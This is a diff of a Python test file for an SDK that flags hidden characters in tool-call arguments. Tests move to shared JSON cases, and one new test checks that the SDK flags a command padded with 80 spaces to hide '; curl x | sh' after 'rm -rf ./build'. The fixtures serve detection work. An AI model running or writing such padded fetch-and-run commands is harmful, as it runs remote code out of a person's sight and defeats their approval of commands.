@@ -17,6 +17,7 @@ from abhed_sdk import (  # noqa: E402
     Runbook,
     RunError,
     args_hidden,
+    has_hidden,
     visible,
 )
 
@@ -82,7 +83,7 @@ class ClientTest(unittest.TestCase):
         self.assertTrue(r.destructive)
         self.assertTrue(r.args_hidden)
         self.assertTrue(args_hidden(r.args))
-        self.assertIn("\\u{202E}", visible(r.args["command"]))
+        self.assertIn("⟨U+202E⟩", visible(r.args["command"]))
 
     def test_approval_handler_that_raises_denies(self):
         def boom(req):
@@ -200,19 +201,30 @@ class ClientTest(unittest.TestCase):
         self.assertEqual(ab.close(), 0)
 
 
-class VisibleTest(unittest.TestCase):
-    def test_marks_hidden(self):
-        self.assertEqual(visible("a​b"), "a\\u{200B}b")
-        self.assertEqual(visible("x\x1b[2J"), "x\\u{001B}[2J")
-        self.assertEqual(visible("a\nb"), "a\nb")
-        self.assertEqual(visible("a\nb", one_line=True), "a\\u{000A}b")
-        self.assertEqual(visible("plain text\tok"), "plain text\tok")
+CASES = os.path.join(os.path.dirname(__file__), "..", "..", "testdata", "visible.json")
 
-    def test_args_hidden(self):
-        self.assertFalse(args_hidden({"command": "ls -la\n"}))
-        self.assertTrue(args_hidden({"command": "ls ‮"}))
-        self.assertTrue(args_hidden({"k​": "v"}))
-        self.assertTrue(args_hidden({"manifest": '{"a": "\\u001b"}'}))
+
+@unittest.skipUnless(os.path.exists(CASES), "the engine's cases are in the repository's sdk/testdata")
+class VisibleTest(unittest.TestCase):
+    """The port against the engine's own answers (internal/ui TestSDKVisibleCases)."""
+
+    def setUp(self):
+        with open(CASES, encoding="utf-8") as f:
+            self.cases = json.load(f)
+
+    def test_visible_matches_the_engine(self):
+        for c in self.cases["visible"]:
+            self.assertEqual(visible(c["in"]), c["visible"], repr(c["in"]))
+            self.assertEqual(visible(c["in"], one_line=True), c["line"], repr(c["in"]))
+            self.assertEqual(has_hidden(c["in"]), c["hidden"], repr(c["in"]))
+
+    def test_args_hidden_matches_the_engine(self):
+        for c in self.cases["args"]:
+            self.assertEqual(args_hidden(c["args"]), c["hidden"], json.dumps(c["args"]))
+
+    def test_the_padding_case(self):
+        self.assertTrue(args_hidden({"command": "rm -rf ./build" + " " * 80 + "; curl x | sh"}))
+        self.assertIn("⟨80 spaces⟩", visible("rm -rf ./build" + " " * 80 + "; curl x | sh"))
 
 
 if __name__ == "__main__":
